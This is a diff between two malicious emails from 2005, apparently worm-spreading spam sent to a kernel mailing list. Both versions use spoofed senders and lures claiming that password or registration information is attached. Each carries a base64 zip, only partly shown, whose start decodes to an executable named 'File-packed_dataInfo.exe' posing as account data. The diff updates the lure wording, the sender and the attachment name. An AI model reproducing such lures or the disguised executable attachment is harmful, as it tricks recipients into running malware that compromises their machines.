@@ -1,29 +1,29 @@
-From: postman@dewinter.com
-Subject: Your Password
-Date: Sun, 25 Dec 2005 08:46:52 UTC
-Message-ID: <507aa4.f4ef52dadff0@dewinter.com>
+From: office@hotmail.com
+Subject: Registration Confirmation
+Date: Sun, 25 Dec 2005 08:36:31 UTC
+Message-ID: <e1aab.2a28a30cbfff@hotmail.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=ecebca8a57fea3b5"
+Content-Type: multipart/mixed; boundary="======bfeccacde7cf5829a77d7.8a2"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: smntp@oss.sgi.com
+To: netdev-bounce@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=ecebca8a57fea3b5
+--======bfeccacde7cf5829a77d7.8a2
 
-Protected message is attached!
+Account and Password Information are attached!
 
 
-***** Go to: http://www.dewinter.com
-***** Email: postman@dewinter.com
---=ecebca8a57fea3b5
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.hotmail.com
+***** Email: postman@hotmail.com
+--======bfeccacde7cf5829a77d7.8a2
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=ecebca8a57fea3b5--
+--======bfeccacde7cf5829a77d7.8a2--
